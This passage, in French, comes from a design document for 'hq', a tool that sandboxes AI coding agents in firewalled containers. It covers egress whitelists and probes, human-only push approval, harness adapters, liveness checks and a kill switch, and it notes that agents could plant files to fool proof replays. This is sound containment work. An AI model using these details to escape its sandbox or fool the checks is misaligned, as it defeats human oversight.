   un réseau nommé s'ouvre parce que la mission le déclare, adresse par
   adresse.
6. La liste blanche est **par rôle** : celle du codeur est ce que sa stack
   déclare pour ses dépendances (registres de paquets) **plus ce que
   l'adaptateur de harnais déclare nécessaire** (l'API du modèle), et rien
   d'autre ; pas de forge, pas de tronc commun — `hq check` est rouge si un
   domaine de la forge du projet apparaît dans la liste du profil mission,
   même via une stack, sans l'arbitrage écrit qu'exige 3.2. Celle de
   l'intégrateur et de la sécurité y ajoute les services de la mission.
7. `hq check` **sonde de l'intérieur** : depuis un conteneur du profil
   mission, et depuis un conteneur du profil système d'une mission donnée
   (`--mission <id>`), joindre un domaine interdit, résoudre un nom hors
   liste et joindre une adresse privée non déclarée doivent échouer. Ces
   sondes existent déjà comme test vivant du dépôt — `cargo test --test
   firewall -- --ignored` lève la paire depuis un Compose généré et essaie
   de sortir par sept chemins. Une sonde ne vaut que si elle réussirait sans
   le pare-feu : les deux premières écrites échouaient de toute façon (un
   certificat, une adresse inexistante) et ont été remplacées par une
   connexion TCP nue et un voisin levé exprès sur le réseau du slot.

**Où vit l'image du sidecar.** Précisé le 2026-09-09, après que la question
« pourquoi `.hq/` ? » a montré une erreur de rangement. `.hq/` est **ce que
`hq init` dépose dans un dépôt qu'il orchestre** — fragments de stack,
Dockerfiles du projet — et jamais l'endroit où `hq` range ses propres
affaires. Le contexte de build du pare-feu appartient à `hq` : il est
**embarqué dans le binaire** et écrit dans un contexte temporaire au moment de
construire l'image. Deux raisons au-delà du rangement : `hq` écrit le moins
possible dans un dépôt qu'il orchestre (3.3), et le fichier qui décrit la cage
de l'agent n'a rien à faire dans un arbre que l'agent peut écrire.

Ce que le sidecar coûte : un conteneur de plus par agent, que `hq` lève et
arrête avec lui, invisible pour l'humain ; et une différence de moteur, parce
que « partage l'espace réseau de ce service » s'écrit `network_mode:
"service:<agent>"` sous Docker Compose et seulement `container:<nom>` sous
`podman-compose` — c'est à l'adaptateur de moteur de le savoir (4.2).

### 4.2 Le moteur — `hq`

Une commande, sur la machine de l'humain, hors conteneur. Elle pilote des
clones, des conteneurs et des runs d'agent. Elle ne connaît le harnais que
par un adaptateur (4.3), et le moteur de conteneurs que par un autre.

| verbe | fait |
|---|---|
| `hq init <dépôt>` | rend un dépôt **existant** orchestrable. Pose, en respectant 3.3 : `hq.yaml`, `AGENTS.md` (ou l'import dans `CLAUDE.md`), la liste des chemins protégés, la batterie cousue, les Dockerfiles et fragments de stack sous `.hq/`, un `.gitattributes` absent. Crée ce qui n'existe pas, dépose à côté ce qui existe, ne touche à rien d'autre, ne tient aucun manifeste, ne désinstalle rien. Rejouable. |
| `hq slot add/reset/rebuild/rm` | un slot = un clone local sans liens durs, un jeu de volumes nommés, et **trois profils de conteneur successifs** (voir « slots et branches » ci-dessous). Les missions s'y succèdent. |
| `hq mission new/start/reframe/status/say/watch/pause/resume/stop/kill/end/fetch/archive` | le cycle d'une mission, du cadrage au rapatriement des commits ; `say` dépose une consigne pour le **run suivant**, `watch` rend deux états (tourne, fini), `stop` termine le run proprement (4.3) |
| `hq exec <slot> <cmd>` | joue une commande dans le conteneur du slot — c'est ainsi que le HQ **rejoue une preuve** sans avoir la stack sur l'hôte. Par défaut sur la **copie git propre de `HEAD`** que la porte 7 utilise, pas sur l'arbre que l'agent a habité : un `Makefile`, un `pytest.ini` ou un alias `cargo` posé par l'agent y tromperait la preuve. Jamais pendant un run sur l'arbre de travail |
| `hq verify <mission>` | les portes de vérification sur la mission du codeur, puis enchaîne la mission d'intégration, puis la mission de sécurité, chacune avec ses portes ; à la première rouge, applique les règles d'itération (4.5) ; à la fin, rend la main à l'humain pour la validation du push. **Reprenable** : son état est persisté à chaque transition, et le relancer reprend au même point |
| `hq push <mission>` | après validation humaine explicite (un argument, pas un dialogue), pousse la branche depuis le dépôt principal et ouvre la pull request. C'est le seul verbe qui touche la forge en écriture, et il refuse sans `INTEGRATED` et `CLEAR` sur le dernier commit et le verdict du codeur sur son ancêtre (4.4). Il parle à l'API de la forge avec un credential de l'humain, rangé au HQ et jamais monté dans un conteneur ; sans credential, il pousse et dit que la pull request est à ouvrir à la main |
| `hq check [--mission <id>]` | dit si un dépôt, ses slots et leurs conteneurs sont dans l'état que ce fichier décrit ; rouge si une restriction n'est pas tenue ; sonde le profil mission sans argument, et le profil système d'une mission donnée avec `--mission` ; **dit ce qu'il n'a pas pu vérifier** (la forge sans credential, LF quand un `.gitattributes` existant ne le force pas) |
| `hq logs <mission>` | rend la sortie structurée des runs, lisible |

**Qui pousse, en une phrase.** L'humain valide ; `hq push`, lancé par la
session HQ sur l'ordre de l'humain, pousse ; aucun agent ne pousse jamais.
Tranché par Arnaud le 2026-09-09 — la revue avait trouvé trois réponses dans
le brouillon. La politique de push intermédiaire
vers `dev` que `claude-setup` autorisait en projet personnel n'existe plus :
une mission, une pull request, un push.

**Le verbe s'appelle `verify`, pas `close`.** Tranché par Arnaud le
2026-09-09 : « close » lui avait fait croire qu'il s'agissait de clôturer la
mission du codeur, alors que le verbe couvre toute la phase de vérification —
portes, intégration, sécurité, itérations — jusqu'à la validation humaine.
Son résultat est `VERIFIED`, ou l'échec nommé. « Clôturer » redevient un mot
pour ce qui vient après le push : `hq mission archive`.

**Pourquoi un seul verbe.** Cette phase est une seule machine à états —
codeur, puis intégrateur, puis sécurité, avec des retours en arrière — et si
elle était découpée en verbes, ce serait à la session HQ de se souvenir où on
en est, de relancer le bon rôle après un rouge, de vérifier que les verdicts
portent le bon commit : exactement ce que le contexte d'une session perd.
`verify` la tient dans un état persisté ; la session HQ le lance, le regarde
(`status`, `logs`, `watch`) et intervient (`say`, `pause`, `stop`, `kill`),
elle n'orchestre pas. `verify` ne pousse jamais, ne merge jamais, n'accepte
aucun risque : ces trois gestes sont à l'humain.

**L'état de `hq` est persisté, et verrouillé.** Tranché par Arnaud le
2026-09-09. `hq verify` dure des heures et doit survivre à la mort de la
session HQ, à une machine en veille, à un terminal fermé. Son état —
mission, étape, run en cours, volets joués, tentatives par lot, verdicts et
leurs `HEAD` — vit dans `~/.hq/<projet>/state/`, un fichier par mission,
écrit à chaque transition. Ce que la seconde revue a fait préciser :

- **Le verrou ne couvre que les verbes qui changent l'état** : `start`,
  `verify`, `reset`, `rebuild`, `rm`, `push`. Les verbes lecteurs — `status`,
  `logs`, `watch`, `check` — passent toujours, et `say`, `pause`, `resume`,
  `stop`, `kill` aussi : ce sont des gestes sur un run en cours, pas des
  transitions concurrentes. `hq exec` lancé par `verify` s'exécute **sous**
  son verrou, il ne le demande pas une seconde fois.
- **L'état d'un run est persistable** : identifiant du conteneur, identifiant
  de session du harnais, pid, écrits à chaque lancement. Un run est lancé
  **détaché** et survit à la mort de la session HQ qui l'a lancé.
- **La reprise re-dérive avant de décider.** Un `hq` qui redémarre ne croit
  pas l'état sur parole : il demande au moteur si le conteneur existe et
  tourne. Vivant : il reprend la surveillance là où elle était. Mort (une
  veille de la machine, Docker Desktop qui redémarre sans ses conteneurs) :
  le run est classé interrompu pour cause du harnais, sans consommer de
  tentative, et relancé en reprenant la session du harnais depuis le dernier
  état de reprise du journal — la reprise à froid que `claude-setup` avait
  éprouvée, appliquée à `hq` lui-même.
- **Un verrou orphelin se lève tout seul** : il porte le pid et l'heure de
  qui l'a pris ; si ce processus n'existe plus, le verrou est libre, avec une
  ligne dans le journal de `hq`.

**Slots et branches.** Tranché par Arnaud le 2026-09-09. La revue a montré qu'avec un slot par rôle, les commits du codeur
n'atteignaient l'intégrateur qu'après un aller-retour par le dépôt principal,
qu'un volet du codeur devait repartir avec les commits de l'intégrateur, et
que la mutation tournait dans un slot sur un `HEAD` qui n'était plus le sien.
Donc : **un slot par mission, et les trois rôles s'y succèdent** sur le même
clone et la même branche, chacun dans son profil de conteneur — `hq` arrête
le conteneur du profil précédent et lève le suivant sur le même arbre. Les
commits ne bougent jamais entre slots ; ils ne sortent du slot que par
`hq mission fetch`, vers le dépôt principal, au moment du push. « Un slot =
un clone, un conteneur » devient « un slot = un clone, des volumes, un
conteneur d'agent à la fois ».

**Les services et le lancement de l'application.** Tranché par Arnaud le
2026-09-09, après que la seconde revue a montré que personne ne relançait le
livrable pour la sécurité une fois le conteneur de l'intégrateur arrêté.
Trois règles, et une seule mécanique quelle que soit la forme de la mission :

1. **Les services sont levés une fois par slot**, sous un nom de projet
   Compose stable, et **jamais arrêtés entre deux profils**. L'état que
   l'intégrateur a posé — migrations jouées, fixtures — survit ; seul le
   conteneur d'agent change.
2. **Lancer l'application n'est le travail d'aucun agent : c'est `hq` qui la
   démarre**, par `hq exec`, dans le profil de l'agent qui va la tester ou
   l'attaquer, avant de lancer cet agent. Il le fait à partir d'un **script
   de lancement qui appartient au projet** : le fragment de stack en fournit
   un par défaut (`run.sh` : comment on démarre une application de cette
   stack), `hq.yaml` peut le remplacer, l'en-tête de mission peut le
   préciser, et quand l'intégrateur est appelé, ce script fait partie de son
   câblage — il peut l'amender et le commite, et c'est cette version que
   `hq` utilise ensuite. Un projet sans exécutable (une bibliothèque) déclare
   `run: none`, et l'agent sécurité travaille sur le code et l'artefact de
   build.

   | forme | qui démarre l'application, à partir de quoi |
   |---|---|
   | intégration puis sécurité | `hq` la démarre pour l'intégrateur, puis la redémarre pour la sécurité, avec le script tel que l'intégrateur l'a commité, sur les mêmes services jamais arrêtés |
   | sécurité seule, sans services | `hq` la démarre pour la sécurité avec le script de la stack ou du projet ; `run: none` pour une bibliothèque |
   | code seul | rien à démarrer, personne n'est appelé |

   La sécurité attaque ainsi exactement ce que l'intégrateur a validé quand
   il est passé, et sinon ce que le projet déclare comme façon normale de
   démarrer. Aucun agent ne décide comment on lance l'application, et il n'y
   a qu'un mécanisme à coder.
3. **L'arbre reste en lecture seule pour la sécurité**, et c'est le fragment
   de stack qui déclare les **répertoires que l'exécution doit pouvoir
   écrire** (`target/`, `.next/`, caches), montés comme volumes propres au
   profil. Ce qui n'est pas déclaré reste fermé.

**La forme déclarative des conteneurs : Compose, généré par `hq`.** Tranché
par Arnaud le 2026-09-09. La revue a établi que Compose est un plugin de la
CLI, pas une notion de l'API : « un Compose levé par l'API » n'existe pas.
Les deux issues pures étaient mauvaises — appeler `docker compose` sur un
fichier écrit à la main enferme dans une CLI, et un format propre réinvente
Compose à moitié. La voie retenue : **Compose reste le format**, connu de
tous et celui dans lequel le projet écrit ses propres services ; **`hq`
génère le fichier** de chaque profil à chaque lancement, à partir de
`hq.yaml`, du fragment de stack et de l'en-tête du `MISSION.md` (image,
utilisateur et uid, montages, variables, réseau, capacité donnée à
l'entrypoint, liste blanche calculée, services du projet inclus) ; puis un
**adaptateur de moteur** l'exécute — `docker compose` ou
`podman-compose`, et le chemin de la socket — et ne fait rien d'autre. `hq`
n'invente aucun format, et la frontière de moteur subsiste, réduite à ce
qu'elle doit être. Le devcontainer et sa CLI en Node ne sont plus une
dépendance ; `devcontainer.json` survit en vue IDE du profil interactif.

Les micro-VM restent une option de second rideau, pour le seul rôle qui
attaque, le jour où `hq` tournerait sur un Linux natif sans VM devant ses
conteneurs, ou pour un livrable dont les données le justifient. Sur macOS et
sous WSL, la VM de Docker Desktop est déjà une frontière entre les conteneurs
et la machine ; ce qui compte tout de suite est de ne jamais donner à un
conteneur d'agent ce qui rend l'évasion triviale (4.1 bis).

**Le moteur est écrit en Rust.** Tranché par Arnaud le 2026-09-09.
`claude-setup` était un seul fichier bash de trois mille lignes, et c'est en
partie ce qui l'a rendu illisible et impossible à tester unitairement. Ce que
le choix engage : un binaire unique `hq`, sans runtime à installer sur la
machine de l'humain ; des types pour les états d'une mission, d'un slot et
d'un verdict, qui rendent les transitions du flux 4.5 vérifiables à la
compilation ; des tests unitaires sur le moteur et des tests d'intégration
contre de vrais `git` et un vrai Compose. Ce que le moteur
continue de déléguer au shell : les fragments par stack (batterie, mutation,
caches, domaines) et les scripts que les conteneurs exécutent, parce qu'ils
tournent dans le conteneur et non dans `hq`.

Pourquoi un langage typé pour « lancer des commandes », question posée et
tranchée le 2026-09-09 : parce que `hq` n'est pas un script qui enchaîne des
commandes, c'est un programme qui **tient un état** — quel slot porte quelle
mission, sur quel `HEAD`, avec quel verdict de quel rôle, combien de volets
joués — et qui **lit des sorties** (JSON du harnais, résultat de mutation) et
**décide en attendant** (`watch`, délais). Le flux 4.5 est une machine à
états ; les types la font respecter à la compilation, les tests la vérifient
sans conteneur, et une sortie de forme inattendue devient une erreur au lieu
d'un silence. Rust plutôt que Python achète en plus le binaire unique sans
runtime ; il coûte du temps d'écriture, et c'est accepté.

**Les slots sont construits par `hq`, pas repris d'un outil tiers.** Tranché
par Arnaud le 2026-09-09. Des outils existent qui isolent un agent dans un
clone et un conteneur (section 5), mais aucun n'a été conçu avec la
contrainte qui fait la sécurité du slot — un `origin` inatteignable depuis le
conteneur — et deux des quatre sont morts ou mourants. Un slot, c'est un
`git clone` local, des conteneurs levés par le Compose généré, et des volumes
nommés ; la doctrine autour est ce qui compte, et elle est ici. Ce qu'on perd
en construisant : la vue d'ensemble graphique que ces outils offrent, absente
de `hq` au départ.

**Le moteur de conteneurs est derrière une frontière**, comme le harnais,
**et cette frontière n'est pas minuscule.** Tranché par Arnaud le 2026-09-09,
après que la seconde revue a dressé la liste réelle de ce qui diffère entre
`docker compose` et `podman-compose` pour tenir ce que 4.1 bis et les profils
exigent. L'adaptateur de moteur porte, et lui seul :

| ce qui diffère | Docker Compose | podman-compose |
|---|---|---|
| partage d'espace réseau pour le sidecar | l'agent rejoint le pare-feu : `network_mode: "service:<pare-feu>"` **sur le service d'agent** (voir le sens, plus bas) | seulement `container:<nom>`, nom généré à connaître avant |
| mappage des utilisateurs en mode sans root | sans objet | `userns_mode: keep-id`, propre à Podman |
| joindre l'hôte sur déclaration | `host.docker.internal` via `host-gateway` | `host.containers.internal` natif, `host-gateway` mal supporté |
| inclusion des services du projet | `include:` fonctionne | `include:` plante — donc **`hq` fusionne lui-même le YAML** des services du projet dans le Compose généré, sur les deux moteurs |
| conditions de démarrage entre services | `service_healthy`, `service_completed_successfully` | la première buguée, la seconde absente |
| profils Compose | fiables | bugués — donc **un fichier par profil** avec un nom de projet stable, jamais `profiles:` |
| adresse du résolveur | dépend du **mode réseau**, pas de la plateforme | idem, autres adresses (aardvark, pasta, slirp) |
| commande et socket | `docker compose`, socket détectée | `podman-compose`, socket détectée |

**Le sens du partage d'espace réseau, vérifié par exécution le 2026-09-09.**
La v2 écrivait `network_mode: "service:<agent>"` sur le sidecar — le
pare-feu rejoignait l'agent. Mesuré sur Docker Compose v5.1.2 : dans ce
sens, **l'agent démarre le premier** et le sidecar second (il en dépend),
donc l'agent a un réseau avant que la moindre règle soit posée, ce qui
contredit 4.1 bis §2. Le sens juste est l'inverse : **le pare-feu possède
l'espace réseau, l'agent le rejoint** (`network_mode: "service:<pare-feu>"`
sur le service d'agent) et l'attend par `depends_on: { <pare-feu>: {
condition: service_healthy } }`. Mesuré dans ce sens : le sidecar pose ses
règles, passe healthy, et l'agent démarre ensuite — avec `cap_drop: [ALL]`,
`no-new-privileges` et l'uid de l'hôte, que le partage d'espace réseau
n'affecte pas. **Conséquence pour le générateur** : Compose refuse
`network_mode` et `networks` sur le même service (« mutually exclusive
`network_mode` and `networks`: invalid compose project », mesuré) — donc
c'est **le pare-feu** qui s'attache au réseau des services du projet et qui
porte les ports, jamais l'agent.

**Le changement de profil ne touche pas aux services, vérifié par exécution
le 2026-09-09.** Sous un nom de projet stable, lever un second fichier qui
**redéclare les services du projet à l'identique** laisse leurs conteneurs
intacts — même identifiant, même heure de démarrage (mesuré). Un fichier qui
les **omet** ne les arrête pas non plus, mais Compose les signale comme
« orphelins » à chaque commande. Donc la règle du générateur : **chaque
fichier de profil redéclare les services du projet à l'identique**, et `hq`
ne passe jamais `--remove-orphans`. Arrêter le conteneur d'agent du profil
précédent reste un geste explicite de l'adaptateur de moteur.

Une bonne part de ces différences sont des bugs ouverts de `podman-compose`,
pas des choix de conception. D'où : **la première version ne vise que
Docker** — Docker Desktop sur macOS et sous WSL, Docker Engine dans WSL, ce
que les deux humains du projet utilisent. **Podman est une cible seconde**,
documentée par ce tableau pour qui l'implémentera, avec la note honnête que
tant que `podman-compose` porte ces bugs, son adaptateur devra contourner ou
générer un Compose plus simple. Rien d'autre du moteur ne remonte dans `hq`.

**La base des images, et pourquoi elle n'est pas la même partout.** Tranché
par Arnaud le 2026-09-09, après qu'il a scanné l'image du sidecar.

- **Les images de stack — les conteneurs d'agent — sont sur une base
  glibc** (Debian slim). musl coûte trop cher là où le travail a lieu : les
  wheels `manylinux` de Python sont glibc et retombent sinon sur une
  compilation depuis les sources, les binaires natifs préconstruits de Node
  visent glibc, Rust change de cible, et la pile de thread par défaut de musl
  (128 Kio contre 8 Mio) fait tomber des logiciels qui ne s'y attendent pas.
- **Le sidecar pare-feu est sur Alpine**, avec son dnsmasq compilé (4.1 bis).
  Mesuré le 2026-09-09 : `debian:bookworm-slim` porte 4 vulnérabilités
  critiques et 52 hautes **dont aucune n'est corrigeable** — Debian les marque
  « ne sera pas corrigé » — et le sidecar fini arrivait à 8 critiques, 55
  hautes et 154 Mo ; sur Alpine, le même sidecar est à 0 et 0, pour 27 Mo.

L'asymétrie est assumée parce que le calcul de risque n'est pas le même : le
conteneur d'agent n'a **aucune capacité** et vit derrière le pare-feu, tandis
que le sidecar détient `NET_ADMIN` et **son socket d'écoute est joignable
depuis l'espace réseau que l'agent partage**. C'est le pire endroit du système
pour accumuler des CVE, et le seul où l'on paie une étape de build pour les
éviter. Ce que ça coûte : deux profils de vulnérabilités à suivre au lieu
d'un, et rien ne les surveille encore dans le temps — un scan d'image en CI
reste à trancher.

**Les fragments de stack.** Un dossier par stack sous `.hq/stacks/<nom>/`
— rappel : `.hq/` appartient au projet orchestré, jamais à `hq` (4.1 bis) :
un Dockerfile (étapes d'image), `allow.txt` (domaines des dépendances),
`prepush.sh` (section de batterie), `mutate.sh` (commande de mutation),
`run.sh` (comment on démarre une application de cette stack, par défaut),
`writable.txt` (les répertoires qu'une exécution doit pouvoir écrire quand
l'arbre est en lecture seule), `perimeter.yaml` (zone de tests pour une
mission de tests), `security.sh` (audit de dépendances, scan de secrets,
analyse statique — la sécurité mécanique). Un
fragment est un script ou un fichier plat, jamais du code de `hq`. Les trois
premières stacks sont celles de `claude-setup` : Rust, Python, Next.js.

### 4.2 bis — Les plateformes

Précision d'Arnaud du 2026-09-09 : le système doit fonctionner **aussi bien
sur macOS que sur Linux sous WSL** (un collègue travaille sous Windows avec
WSL). Windows natif n'est pas une cible : WSL est Linux. Ce que ça impose,
et qui se vérifie en CI sur les deux :

| point | macOS | Linux / WSL | règle pour `hq` |
|---|---|---|---|
| binaire | arm64 et x86_64 | x86_64 et arm64 | Rust, compilé nativement sur chaque cible en CI (la compilation croisée macOS → Linux demande un éditeur de liens, on ne compte pas dessus) ; aucune dépendance native ; à l'exécution, la commande Compose du moteur et un client HTTP pour l'API de la forge |
| moteur de conteneurs | Docker Desktop **ou OrbStack** (VM Linux ; OrbStack est ce qu'Arnaud utilise, API Docker compatible) ; Podman Desktop existe aussi, cible seconde | Docker Desktop avec WSL2, ou Docker Engine dans WSL ; Podman, cible seconde | l'API est la même ; `hq` détecte la socket, ne suppose pas son chemin ; en mode rootless, l'uid vu par l'hôte passe par les subuid, et l'adaptateur de moteur le sait |
| propriétaire des fichiers | mappé par VirtioFS ; cas connus de fichiers vus `root:root` | l'uid de l'hôte doit être celui de l'utilisateur du conteneur, sinon un fichier `600` est illisible et **git refuse l'arbre** (`safe.directory`) | `hq` passe uid et gid de l'hôte au build et au run ; l'image pré-crée les points de montage des **volumes nommés** avec cet uid, sinon ils naissent à root et la toolchain ne peut pas y écrire ; `hq check` vérifie que git accepte l'arbre depuis le conteneur |
| chemins montables | Docker Desktop ne partage que `/Users`, `/Volumes`, `/private`, `/tmp` par défaut | tout le système de fichiers WSL ; **`/mnt/c` très lent et sans permissions** | dépôt et slots vivent sous un chemin partagé sur macOS et dans le système de fichiers Linux sous WSL ; `hq check` refuse `/mnt/` et un chemin non partagé |
| casse des noms | APFS insensible par défaut | ext4 sensible, dans le conteneur aussi | `hq check` signale deux chemins ne différant que par la casse |
| services de l'hôte depuis un conteneur | `host.docker.internal` | idem avec Docker Desktop ; à déclarer soi-même avec Docker Engine seul | l'adaptateur de moteur le sait, pas le fichier de profil du projet ; et l'hôte n'est joignable que si la mission le déclare (4.1 bis) |
| résolveur DNS du conteneur | dépend du moteur, pas de la plateforme : 127.0.0.11 sur un réseau utilisateur, autre chose sur le réseau par défaut (mesuré le 2026-09-09 sous **OrbStack**, le moteur d'Arnaud : `0.250.250.200`) | 127.0.0.11 sur un réseau utilisateur sous Engine | ne pas supposer l'adresse. Dans un profil d'agent la question ne se pose plus : le sidecar **détourne le port 53** de l'espace réseau partagé vers son propre résolveur (4.1 bis §3), quelle que soit l'adresse écrite dans `/etc/resolv.conf` par le moteur |
| fins de ligne | LF | LF, mais un éditeur Windows peut écrire CRLF | `hq init` pose un `.gitattributes` (`* text=auto eol=lf`) s'il n'en existe pas ; `hq check` vérifie ce qu'il lit |
| mémoire | celle de Docker Desktop | WSL2 prend la moitié de la RAM par défaut (`.wslconfig`) | `hq check` affiche la mémoire vue par le moteur et avertit sous un seuil |
| clone local | même système de fichiers | dans WSL | `--no-hardlinks` (3.2) ; le slot est créé à côté du dépôt, jamais sur un autre volume |
| tmux | inutile sur l'hôte | inutile sur l'hôte | ne sert que **dans l'image**, comme dernier recours de `state()` pour un harnais sans sortie structurée ; c'est le Dockerfile qui l'installe |
| CI | un runner macOS avec un moteur de conteneurs installé par la CI elle-même | un runner Linux | les tests d'intégration de `hq` tournent sur les deux ; ceux qui ont besoin d'un moteur sont marqués et sautent proprement sans lui |

**Deux versions de Compose, et c'est tant mieux.** Constaté par Arnaud le
2026-09-09 en lisant les journaux de la CI : sa machine porte **Compose
v5.1.2** (moteur 29.4.0), le coureur Ubuntu de GitHub en porte **v2.38.2** —
trois versions majeures d'écart. Plutôt que d'aligner les deux, on garde
l'écart et on s'en sert : c'est la seule couverture inter-versions qu'on
aura, et elle correspond à la réalité des machines qu'`hq` rencontrera.

Ce qui a été **refait à l'identique sur la v2.38.2**, le même jour : les trois
profils générés sont acceptés ; le pare-feu pose ses règles, passe *healthy*,
et l'agent démarre ensuite ; `network_mode` et `networks` restent mutuellement
exclusifs, au mot près ; un changement de profil sous un nom de projet stable
laisse le conteneur du service intact. Et la **batterie vivante entière** —
les deux profils, les onze sondes — passe sous les deux versions.

Ce que ça impose : **v2.38 est le plancher** tant que rien n'exige plus
récent, et les tests qui touchent un moteur acceptent `HQ_COMPOSE` pour être
rejoués sous une autre commande que `docker compose`. Un jour où une des deux
versions divergera, c'est un test qui le dira, pas un utilisateur.

### 4.3 Les adaptateurs — un par harnais

Tranché par Arnaud le 2026-09-09, après avoir posé comment il travaille
réellement : depuis une session d'assistant au HQ, à qui il dit quoi faire ;
c'est elle qui crée le slot, le conteneur, lance le harnais dedans, et lui
parle. **Cette méthode ne change pas.** Ce qui change, c'est où vit la
plomberie propre à chaque harnais.

**Il y a deux harnais dans ce flux, et un seul a besoin d'un adaptateur.**

- La **session du HQ** est un harnais (Claude Code aujourd'hui), mais elle ne
  pilote rien directement : elle lance `hq`. Son agnosticité ne coûte rien —
  il suffit que `hq` soit décrit dans le `AGENTS.md` du HQ pour que n'importe
  quel assistant sache s'en servir. Pas d'adaptateur.
- L'**agent dans le conteneur** est l'autre harnais, et tout ce qui le
  concerne est propre à lui : l'installer, le connecter, le lancer avec les
  bonnes options, savoir où vit sa configuration, lire son état, l'arrêter,
  câbler ses gardes s'il en a. Dans `claude-setup` cette plomberie était
  dispersée dans `slot.sh`, `mission.sh` et `setup.sh`. **L'adaptateur, c'est
  cette plomberie rassemblée**, avec le même contrat pour chaque harnais.

**Le contrat**, un trait Rust, une implémentation par harnais, et `hq` ne
tient qu'une valeur `Box<dyn Harness>` choisie par `hq.yaml` ou par la mission :

| `hq` a besoin de | l'adaptateur sait, et `hq` ignore |
|---|---|
| `provision()` — préparer l'image et le volume du harnais | ce qu'il faut installer, où vit la config (un volume nommé par slot, parce que la reprise de session en dépend), comment se **connecter sans interface**, et comment le harnais lit `AGENTS.md` |
| `launch(role, mission, resume) -> RunHandle` — lancer un run | la ligne de commande d'une session **sans interface** avec sortie structurée, la reprise par identifiant de session (imposé par `hq`, pas lu après coup), les drapeaux qui font qu'une permission est **refusée et non redemandée en boucle** |
| `state(handle) -> Running \| Finished(Outcome)` | son flux structuré et son code de sortie ; le panneau tmux en dernier recours pour un harnais qui n'a rien d'autre |
| `Outcome` — classer la fin d'un run | **fini**, **échoué pour une cause du harnais** (quota, jeton expiré, réseau, plantage) ou **échoué pour une cause de la mission**. La distinction compte : un run tombé pour quota est rejoué, il ne consomme pas un volet |
| `stop(handle)` | le signal qui termine un tour proprement plutôt que celui qui le tranche (pour Claude Code, `SIGINT` et non `SIGTERM`) |
| `guards()` — doubler les restrictions | hooks pour Claude Code et pour Codex, plugins pour OpenCode ; passés **à l'invocation**, jamais écrits dans le slot (3.3) ; **optionnel par construction**, la garde est ailleurs (3.2) |
| `expose(role)` — donner un rôle | prompt système ajouté, fichier de règles, sous-agent : la forme que le harnais préfère pour recevoir le prompt du codeur, de l'intégrateur ou de la sécurité |

Ce qui n'est **pas** dans l'adaptateur, et c'est ce qui rend l'agnosticité
réelle : les prompts de rôle (des fichiers du socle), le protocole de mission,
les portes, le flux, le clone et le conteneur. L'adaptateur les reçoit en
argument, il ne les possède pas.

**Mode sans interface, par défaut.** `claude-setup` lançait une session
interactive dans tmux et lisait son écran ; chaque changement d'affichage de
la CLI cassait le détecteur. Les trois harnais visés ont un mode sans
interface avec sortie structurée et reprise de session, vérifié sur leur
documentation le 2026-09-09 :

| harnais | run | sortie | reprise | connexion sans interface | ce qu'il faut savoir |
|---|---|---|---|---|---|
| Claude Code | `claude -p` | `--output-format json` / `stream-json` | `--resume <id>`, `--session-id` pour imposer l'identifiant | jeton de longue durée (`claude setup-token`, **un navigateur et un humain une fois par an**) ou clé d'API (facturation API) | le mode de permission par défaut refuse mais laisse l'agent réessayer : `--permission-mode` et `--permission-prompts none` sont nécessaires. `--bare`, futur défaut, **saute `CLAUDE.md`** et ignore le jeton : l'adaptateur passe alors les règles par `--append-system-prompt-file` et n'utilise que la clé d'API. Un `.claude/settings.json` commité dans le dépôt cible est exécuté sans dialogue de confiance : l'isolation du conteneur est ce qui le rend acceptable |
| Codex | `codex exec` | `--json` (JSON Lines), `--output-last-message`, `--output-schema` | `codex exec resume <id>` | `CODEX_API_KEY` ou `~/.codex/auth.json` | hooks depuis 0.117 (`PreToolUse` bloque ou réécrit) |
| OpenCode | `opencode run` | `--format json` | `--session <id>`, `--continue` | à vérifier avant d'écrire l'adaptateur | plugins `tool.execute.before` qui bloquent ; `--auto` approuve ce qui n'est pas refusé |

Trois choses en découlent :

- **L'état de l'agent n'est plus deviné.** Le processus tourne ou a fini, et
  la sortie dit ce qu'il a fait. `watch` a **deux** états, tourne et fini ;
  « bloqué » n'est plus un état lu sur un écran mais un constat des contrôles
  de vie décrits ci-dessous.
- **Un run par lot, et un lot dure ce qu'il dure.** Tranché par Arnaud le
  2026-09-09. Le mot « tranche » disparaît. Une mission est une suite de
  **lots** — petits, chacun avec sa preuve, commités en commits qui tiennent
  seuls — et un **run** est l'invocation du harnais pour **un** lot : `hq` le
  lance avec la consigne « fais le lot N », attend sa fin, lit `JOURNAL.md` et
  `VERDICT.json`, applique les règles (lots restants, volets, tentatives), et
  relance le lot suivant en reprenant la session. Un run **n'a pas de durée
  maximale** : il se termine quand le lot est fini et prouvé, ou quand le HQ
  constate qu'il est bloqué. **Jamais un arrêt parce qu'une durée est
  atteinte.** Le contrat de sortie d'un run, vérifié par `hq` : le lot est
  commité et sa preuve passe, ou le run dit qu'il a échoué ; l'arbre est
  commitable ; le journal porte un bloc `ÉTAT DE REPRISE` qui nomme `HEAD`, le
  lot, la prochaine action ; et pour le dernier lot, `VERDICT.json` existe. Un
  run qui sort sans ce contrat est une tentative échouée du lot.
- **Deux niveaux de contrôle pendant un run**, tranchés par Arnaud le
  2026-09-09, et ce qui les distingue :
  - **toutes les 15 minutes, la vie et le progrès**, par les signaux seuls,
    sans rien demander à l'agent — le processus est vivant, le flux du harnais
    a produit de nouveaux événements, l'arbre ou le journal a changé, les
    appels d'outil ne se répètent pas à l'identique. Silencieux, sans coût
    pour l'agent ;
  - **toutes les 45 minutes, le checkpoint**, le protocole hérité : l'agent a
    pour consigne d'écrire à ce rythme un bloc `ÉTAT DE REPRISE` dans son
    journal (commit courant, étape du lot, prochaine action, et **ce qu'il
    attend s'il attend** — une compilation, un run long — avec l'heure et la
    durée prévue). Le HQ lit ce bloc. Présent et cohérent avec les signaux :
    le lot continue. Absent mais du progrès : le lot continue, la consigne est
    rappelée au run suivant. Absent **et** aucun signal depuis le dernier
    contrôle : on entre dans le cas bloqué.
- **Le kill switch, seulement sur un blocage constaté.** Trois contrôles de
  quinze minutes sans aucun changement, ou une répétition du même appel
  d'outil au-delà d'un seuil, ou un processus mort ou muet : `hq` arrête le
  run, le classe **tentative échouée du lot**, écrit le constat dans le
  journal, et relance une tentative avec ce constat en consigne. Un lot a
  droit à **N tentatives**, trois par défaut ; au-delà, la mission s'arrête et
  remonte à l'humain avec les journaux des tentatives côte à côte. Réserve
  dite : « aucun changement » est une heuristique, et un agent qui attend une
  compilation longue ne produit rien pendant plusieurs minutes — d'où le seuil
  à trois contrôles, et l'attente déclarée au checkpoint, qui lève
  l'ambiguïté quand le bloc est là.
- **Un garde-fou humain sur la durée, pas un couperet.** Au-delà d'une durée
